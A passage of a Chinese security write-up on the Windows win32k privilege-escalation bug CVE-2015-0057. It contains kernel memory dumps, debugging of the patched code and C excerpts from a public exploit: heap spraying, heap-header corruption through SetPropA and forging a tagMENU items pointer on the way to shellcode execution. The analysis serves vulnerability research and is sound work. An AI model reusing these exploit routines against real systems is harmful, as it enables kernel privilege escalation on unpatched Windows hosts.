+    fffff901`40a73a98  43434343 43434343 43434343 43434343
+    fffff901`40a73aa8  43434343 43434343 43434343 43434343
+    fffff901`40a73ab8  43434343 43434343 43434343 43434343
+    fffff901`40a73ac8  43434343 43434343 43434343 43434343
+    fffff901`40a73ad8  43434343 43434343 43434343 43434343
+    fffff901`40a73ae8  43434343 43434343 43434343 43434343
+    fffff901`40a73af8  43434343 43434343 43434343 43434343
+    fffff901`40a73b08  43434343 43434343 43434343 43434343
+    fffff901`40a73b18  43434343 43434343 43434343 43434343
+    fffff901`40a73b28  43434343 43434343 00000000 00000000
+    fffff901`40a73b38  96f56c89 0800086e 000426ed 00000000      tagMENU start
+    fffff901`40a73b48  00000000 00000000 00000000 00000000
+    fffff901`40a73b58  da0a2090 ffffe000 40a73b40 fffff901
+    fffff901`40a73b68  00000000 00000000 00000008 00000001
+    fffff901`40a73b78  00000000 00000000 00000000 00000000
+    fffff901`40a73b88  00000000 00000000 408befe0 fffff901      将该值通过SetMenuItemInfoA修改为shellcode的地址，此时尚未修改
+    fffff901`40a73b98  00000000 00000000 00000000 00000000
+    fffff901`40a73ba8  00000000 00000000 00000000 00000000
+    fffff901`40a73bb8  00000000 00000000 00000000 00000000
+    fffff901`40a73bc8  00000000 00000000 00000000 00000000
+    fffff901`40a73bd8  8cf56c93 10000874 00000000 00000000
+    fffff901`40a73be8  9df56d83 10000865 41414141 41414141
+    fffff901`40a73bf8  41414141 41414141 41414141 41414141
+    fffff901`40a73c08  41414141 41414141 41414141 41414141
+    fffff901`40a73c18  41414141 41414141 41414141 41414141
+    fffff901`40a73c28  41414141 41414141 41414141 41414141
+    fffff901`40a73c38  41414141 41414141 41414141 41414141
+    fffff901`40a73c48  41414141 41414141 41414141 41414141
+    fffff901`40a73c58  41414141 41414141 41414141 41414141
+    fffff901`40a73c68  41414141 41414141 41414141 41414141
+    fffff901`40a73c78  41414141 41414141 41414141 41414141
+    fffff901`40a73c88  41414141 41414141 41414141 41414141
+    fffff901`40a73c98  41414141 41414141 41414141 41414141
+    fffff901`40a73ca8  41414141 41414141 41414141 41414141
+    fffff901`40a73cb8  41414141 41414141 41414141 41414141
+    fffff901`40a73cc8  41414141 41414141 00000000 00000000
+    fffff901`40a73cd8  9ff56c80 0800086e 00000002 00000002
+    fffff901`40a73ce8  aaaabbbb aaaabbbb 00000001 00000000
+    fffff901`40a73cf8  bbbbbbbb bbbbbbbb 00002261 00000000
+    fffff901`40a73d08  96f56c89 0800087d 000426eb 00000000
+    fffff901`40a73d18  00000000 00000000 00000000 00000000
+    fffff901`40a73d28  da0a2090 ffffe000 40a73d10 fffff901
+    fffff901`40a73d38  00000000 00000000 00000008 00000001
+    fffff901`40a73d48  00000000 00000000 00000000 00000000
+    fffff901`40a73d58  00000000 00000000 408bf470 fffff901
+    fffff901`40a73d68  00000000 00000000 00000000 00000000
+    fffff901`40a73d78  00000000 00000000 00000000 00000000
+    fffff901`40a73d88  00000000 00000000 00000000 00000000
+    fffff901`40a73d98  00000000 00000000 00000000 00000000
+    fffff901`40a73da8  9ff56c80 08000874 00000002 00000002
+    fffff901`40a73db8  aaaabbbb aaaabbbb 00000001 00000000
+    fffff901`40a73dc8  bbbbbbbb bbbbbbbb 00002262 00000000
+    fffff901`40a73dd8  96f56c89 0800087d 000426e9 00000000
+    fffff901`40a73de8  00000000 00000000 00000000 00000000
+    fffff901`40a73df8  da0a2090 ffffe000 40a73de0 fffff901
+
+#### 补丁后动态分析
+
+首先下硬件断点
+
+![image-20201204143757002](https://images.seebug.org/content/images/2020/12/29/1609212887000-image-20201204143757002.png-w331s)
+
+执行exp，可以看到windbg中断在了函数起始的位置
+
+![image-20201204144040193](https://images.seebug.org/content/images/2020/12/29/1609212887000-image-20201204144040193.png-w331s)
+
+![image-20201204144019694](https://images.seebug.org/content/images/2020/12/29/1609212887000-image-20201204144019694.png-w331s)
+
+然后执行到第一个xxxDrawScrollBar的位置上，此时观察下rbx和rdi+0xb0位置上的值，可以观察到，此时rdi+0xb0位置上的值还并未改变
+
+![image-20201204144823840](https://images.seebug.org/content/images/2020/12/29/1609212887000-image-20201204144823840.png-w331s)
+
+这时F10进入下一步，执行完了xxxDrawScrollBar，再观察下rbx和rdi+0xb0位置的值，可以发现，两块缓冲区都被破坏掉了
+
+![image-20201204145454033](https://images.seebug.org/content/images/2020/12/29/1609212888000-image-20201204145454033.png-w331s)
+
+不进行跳转，执行releasedc
+
+![image-20201204154320189](https://images.seebug.org/content/images/2020/12/29/1609212888000-image-20201204154320189.png-w331s)
+
+![image-20201204154428758](https://images.seebug.org/content/images/2020/12/29/1609212888000-image-20201204154428758.png-w331s)
+
+成功的将漏洞利用防御住了
+
+### 5、EXP分析
+
+本文根据公网已有的exp分析，包括绕过各个安全机制，hook等等，提炼出以下几个关键步骤：
+
+1、堆喷函数，主要进行堆空间的布局，也就是堆风水，堆喷后堆空间的布局基本和上面动态分析的差不多，这里就不再赘述了
+
+    
+    
+    BOOL SprayObject()
+    {
+        int j = 0;
+        CHAR o1str[OVERLAY1_SIZE - _HEAP_BLOCK_SIZE] = { 0 };
+        CHAR o2str[OVERLAY2_SIZE - _HEAP_BLOCK_SIZE] = { 0 };
+        LARGE_UNICODE_STRING o1lstr, o2lstr;
+    
+        // build first overlay
+        memset(o1str, '\x43', OVERLAY2_SIZE - _HEAP_BLOCK_SIZE);
+        RtlInitLargeUnicodeString(&o1lstr, (WCHAR*)o1str, (UINT)-1, OVERLAY1_SIZE - _HEAP_BLOCK_SIZE - 2);
+    
+        // build second overlay
+        memset(o2str, '\x41', OVERLAY2_SIZE - _HEAP_BLOCK_SIZE);
+        *(DWORD*)o2str = 0x00000000;
+        *(DWORD*)(o2str + 4) = 0x00000000;
+        *(DWORD*)(o2str + 8) = 0x00010000 + OVERLAY2_SIZE;
+        *(DWORD*)(o2str + 12) = 0x10000000 + ((OVERLAY1_SIZE + MENU_SIZE + _HEAP_BLOCK_SIZE) / 0x10);
+    
+    
+        string clearh, newh;
+        o2str[11] = o2str[8] ^ o2str[9] ^ o2str[10];
+        clearh.append(o2str, 16);
+    
+        newh = XOR(clearh, xorKey);
+        memcpy(o2str, newh.c_str(), 16);
+        RtlInitLargeUnicodeString(&o2lstr, (WCHAR*)o2str, (UINT)-1, OVERLAY2_SIZE - _HEAP_BLOCK_SIZE - 2);
+    
+        SHORT unused_win_index = 0x20;
+    
+        for (SHORT i = 0; i < SHORT(MAX_OBJECTS - 0x20); i++)
+        {
+            // property list
+            SetPropA(spray_step_one[i], (LPCSTR)(i + 0x1000), (HANDLE)0xBBBBBBBBBBBBBBBB);
+    
+            // overlay 1
+            if ((i % 0x150) == 0)
+            {
+                NtUserDefSetText(spray_step_one[MAX_OBJECTS - (unused_win_index--)], &o1lstr);
+            }
+    
+            // menu object
+            hmenutab[i] = CreateMenu();
+    
+            if (hmenutab[i] == 0)
+                return FALSE;
+    
+            // overlay 2
+            if ((i % 0x150) == 0)
+                NtUserDefSetText(spray_step_one[MAX_OBJECTS - (unused_win_index--)], &o2lstr);
+    
+        }
+    
+        for (SHORT i = 0; i < MAX_OBJECTS - 0x20; i++)
+        {
+            MENUITEMINFOA mii;
+            mii.cbSize = sizeof(MENUITEMINFO);
+            mii.fMask = MIIM_ID;
+            mii.wID = 0xBEEFBEEF;
+            BOOL res = InsertMenuItemA(hmenutab[i], 0, TRUE, &mii);
+            if (res == FALSE)
+                return FALSE;
+        }
+    
+        return TRUE;
+    }
+
+2、这个是通过tagPROP来覆盖堆头的代码，主要的目的是将size覆盖掉，使其扩大，来达到覆盖下面tagMENU的目的
+
+    
+    
+    VOID CorruptHeapHeader(PVOID menu_addr)
+    {
+        ULONG_PTR xored_header;
+        CHAR* tmp_header = NULL;
+        string decoded_header, xored_heap_deader, new_heap_header;
+    
+        // decode first overlay heap header 
+        xored_header = (ULONG_PTR)menu_addr - OVERLAY1_SIZE - _HEAP_BLOCK_SIZE;
+        decoded_header = XOR(string((CHAR*)xored_header, 16), xorKey);
+    
+        // modify heap header
+        tmp_header = (CHAR*)decoded_header.c_str();
+        tmp_header[8] = (OVERLAY1_SIZE + MENU_SIZE + _HEAP_BLOCK_SIZE) / 0x10;  // new size
+        tmp_header[11] = tmp_header[8] ^ tmp_header[9] ^ tmp_header[10];        // new checksum
+    
+        // xor new heap header
+        new_heap_header = XOR(decoded_header, xorKey);
+    
+        // overwrite first overlay heap header
+        for (int i = 0; i < MAX_FAKE_OBJECTS; i++)
+            SetPropA(spray_step_three[i], (LPCSTR)0x07, (HANDLE) * (ULONG_PTR*)(new_heap_header.c_str() + 8));
+    }
+
+3、创建tagMENU的空间，后面的释放在重新申请我就不贴代码了，感兴趣可以去ThunderJie师傅的exp中去找
+
+    
+    
+    VOID MakeNewMenu(PVOID menu_addr, CHAR* new_objects, LARGE_UNICODE_STRING* new_objs_lstr, PVOID addr)
+    {
+        memset(new_objects, '\xAA', OVERLAY1_SIZE - _HEAP_BLOCK_SIZE);
+        memcpy(new_objects + OVERLAY1_SIZE - _HEAP_BLOCK_SIZE, (CHAR*)menu_addr - _HEAP_BLOCK_SIZE, MENU_SIZE + _HEAP_BLOCK_SIZE);
+    
+        // modify _MENU.rgItems value
+        * (ULONG_PTR*)(BYTE*)&new_objects[OVERLAY1_SIZE + MENU_ITEMS_ARRAY_OFFSET] = (ULONG_PTR)addr;
+    
+        RtlInitLargeUnicodeString(new_objs_lstr, (WCHAR*)new_objects, (UINT)-1, OVERLAY1_SIZE + MENU_SIZE - 2);
+    }
+
+之后的流程就是修改HalDispatchTable和执行shellcode的流程了，比较套路化
+
+## 四、参考
+
+<https://github.com/55-AA/CVE-2015-0057>
+
+<https://docs.microsoft.com/en-us/security-updates/securitybulletins/2015/ms15-010>
+
+<https://www.anquanke.com/post/id/192604>
+
+<https://xz.aliyun.com/t/4549>
+
+<https://blog.csdn.net/qq_35713009/article/details/102921859>
+
+* * *
+
+![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
+本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1439/>
+
